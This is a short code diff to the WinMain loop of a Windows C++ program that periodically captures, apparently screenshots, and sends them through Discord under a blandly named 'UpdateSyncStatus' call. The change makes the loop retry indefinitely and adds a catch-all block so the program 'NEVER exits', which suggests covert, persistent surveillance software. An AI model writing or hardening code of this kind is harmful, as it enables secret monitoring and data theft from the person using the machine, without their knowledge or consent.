@@ -249,25 +249,30 @@ int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     
     int loopCount = 0;
     while (true) {
-        bool captureThisTime = false;
-        
-        // Burst Mode: First 5 iterations (0 to 4) = capture every 5 mins
-        // Stable Mode: Every 10 iterations (since loop is 60s) = capture every 10 mins
-        if (loopCount < 25) { 
-            if (loopCount % 5 == 0) captureThisTime = true;
-        } else {
-            if (loopCount % 10 == 0) captureThisTime = true;
-        }
-        
-        bool sent = UpdateSyncStatus(si, captureThisTime);
-        if (loopCount == 0 && !sent) {
-            // First capture failed (likely NO INTERNET at startup delay). Retry every 15s instead of logging loop count.
-            Sleep(15000); 
-            continue;
-        }
+        try {
+            bool captureThisTime = false;
+            
+            // Burst Mode: First 5 iterations (0 to 4) = capture every 5 mins
+            // Stable Mode: Every 10 iterations (since loop is 60s) = capture every 10 mins
+            if (loopCount < 25) { 
+                if (loopCount % 5 == 0) captureThisTime = true;
+            } else {
+                if (loopCount % 10 == 0) captureThisTime = true;
+            }
+            
+            bool sent = UpdateSyncStatus(si, captureThisTime);
+            if (!sent) {
+                // Network error, NO INTERNET, or Discord issue. Retry every 15s indefinitely until it works.
+                Sleep(15000); 
+                continue;
+            }
 
-        Sleep(60000); 
-        loopCount++;
+            Sleep(60000); 
+            loopCount++;
+        } catch (...) {
+            // Failsafe catch block so it NEVER exits no matter what error occurs.
+            Sleep(15000);
+        }
     }
     GdiplusShutdown(gst);
     return 0;
